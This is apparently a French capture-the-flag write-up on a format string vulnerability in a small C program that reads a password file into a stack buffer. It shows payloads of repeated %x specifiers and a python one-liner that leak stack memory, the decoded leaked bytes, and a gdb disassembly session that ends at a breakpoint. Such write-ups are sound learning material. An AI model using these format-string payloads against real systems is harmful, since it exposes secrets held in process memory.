## format String (lecture)
1. #include <stdio.h>
2. #include <unistd.h>
3.  
4. int main(int argc, char *argv[]){
5.         FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
6.         char buffer[32];
7.         fgets(buffer, sizeof(buffer), secret);
8.         printf(argv[1]);
9.         fclose(secret);
10.         return 0;
11. }


Methode 1
=======
On chercher notre 414141
./ch5 AAAA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xx%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x |grep 41
AAAA20804b008b7e562f308049ff42bffffb04bffffc2e2f804b00839617044282936646d617045a64b7e564adb7fd03c4b7fff0008048579fade1800804857000b7e3caf32bffffb04bffffb10b7fece6a2bffffb04bffffaa4804a014804825cb7fd0000000158c3ef42dedbae4000280484300b7ff2660b7e3ca09b7fff000280484300804845180484e42bffffb04804857080485e0b7fed300bffffafc1c2bffffc2ebffffc340bffffd78bffffd8cbffffda0bffffdb0bffffdd1bffffdfcbffffe1ebffffe32bffffe47bffffe52bffffe71bffffee4bfffff03bfffff14bfffff5abfffff62bfffff82bfffff9abfffffcfbfffffee020b7fdd41821b7fdd000101fabfbff61000116438048034420597b7fde0008098048430b451c4b5d451e451x17119bffffc0b1fbffffff6fbffffc1b000fc0000006ffade1825c5f53c105e95256912dc573638360002f2e00003568634141414178257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825


./ch5 BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xx%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x |grep 42
BBBB20804b008b7e562f308049ff42bffffb34bffffc5a2f804b00839617044282936646d617045a64b7e564adb7fd03c4b7fff00080485793dfd9e00804857000b7e3caf32bffffb34bffffb40b7fece6a2bffffb34bffffad4804a014804825cb7fd00000007fe5b163f9e7f06000280484300b7ff2660b7e3ca09b7fff000280484300804845180484e42bffffb34804857080485e0b7fed300bffffb2c1c2bffffc5abffffc600bffffd78bffffd8cbffffda0bffffdb0bffffdd1bffffdfcbffffe1ebffffe32bffffe47bffffe52bffffe71bffffee4bfffff03bfffff14bfffff5abfffff62bfffff82bfffff9abfffffcfbfffffee020b7fdd41821b7fdd000101fabfbff61000116438048034420597b7fde0008098048430b451c4b5d451e451x17119bffffc3b1fbffffff6fbffffc4b000240000008d3dfd9eed34fc059b2076c69a8e5d4363836002f2e00003568634242424278257825


./ch5 $(python -c 'print "%08x-" * 20')
00000020-0804b008-b7e562f3-00000000-08049ff4-00000002-bffffbe4-bffffd0d-0000002f-0804b008-39617044-28293664-6d617045-00000a64-b7e564ad-b7fd03c4-b7fff000-08048579-5f04f500-08048570-
#on remet les bytes dans l'ordre car little indian
20000000 080b0408 f362e5b7 00000000 f49f0408 02000000  e4fbffbf 0dfdffbf 2f000000 08b00408  44706139 64362928 4570616d 640a0000 ad64e5b7 c403fdb7  00f0ffb7 79850408 00f5045f  70850408  

convertion en ascii: 
Dpa9d6)(Epamd



Analyse gdb (mais manque de privil√®ge pour lire le fichier
========

app-systeme-ch5@challenge02:~$ gdb ch5
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ch5...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x080484e4 <+0>:	push   %ebp
   0x080484e5 <+1>:	mov    %esp,%ebp
   0x080484e7 <+3>:	and    $0xfffffff0,%esp
   0x080484ea <+6>:	sub    $0x50,%esp
   0x080484ed <+9>:	mov    0xc(%ebp),%eax
   0x080484f0 <+12>:	mov    %eax,0x1c(%esp)
   0x080484f4 <+16>:	mov    %gs:0x14,%eax
   0x080484fa <+22>:	mov    %eax,0x4c(%esp)
   0x080484fe <+26>:	xor    %eax,%eax
   0x08048500 <+28>:	mov    $0x8048640,%edx
   0x08048505 <+33>:	mov    $0x8048644,%eax
   0x0804850a <+38>:	mov    %edx,0x4(%esp)
   0x0804850e <+42>:	mov    %eax,(%esp)
   0x08048511 <+45>:	call   0x8048420 <fopen@plt>
   0x08048516 <+50>:	mov    %eax,0x28(%esp)
   0x0804851a <+54>:	mov    0x28(%esp),%eax
   0x0804851e <+58>:	mov    %eax,0x8(%esp)
   0x08048522 <+62>:	movl   $0x20,0x4(%esp)
   0x0804852a <+70>:	lea    0x2c(%esp),%eax
   0x0804852e <+74>:	mov    %eax,(%esp)
   0x08048531 <+77>:	call   0x80483d0 <fgets@plt>
   0x08048536 <+82>:	mov    0x1c(%esp),%eax
   0x0804853a <+86>:	add    $0x4,%eax
   0x0804853d <+89>:	mov    (%eax),%eax
   0x0804853f <+91>:	mov    %eax,(%esp)
   0x08048542 <+94>:	call   0x80483c0 <printf@plt>
   0x08048547 <+99>:	mov    0x28(%esp),%eax
   0x0804854b <+103>:	mov    %eax,(%esp)
   0x0804854e <+106>:	call   0x80483e0 <fclose@plt>
   0x08048553 <+111>:	mov    $0x0,%eax
   0x08048558 <+116>:	mov    0x4c(%esp),%edx
   0x0804855c <+120>:	xor    %gs:0x14,%edx
   0x08048563 <+127>:	je     0x804856a <main+134>
   0x08048565 <+129>:	call   0x80483f0 <__stack_chk_fail@plt>
   0x0804856a <+134>:	leave  
   0x0804856b <+135>:	ret    
End of assembler dump.
(gdb) b*main+45
Breakpoint 1 at 0x8048511
(gdb) r
Starting program: /challenge/app-systeme/ch5/ch5 

Breakpoint 1, 0x08048511 in main ()
(gdb) b*main+77
Breakpoint 2 at 0x8048531
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /challenge/app-systeme/ch5/ch5 

Breakpoint 1, 0x08048511 in main ()







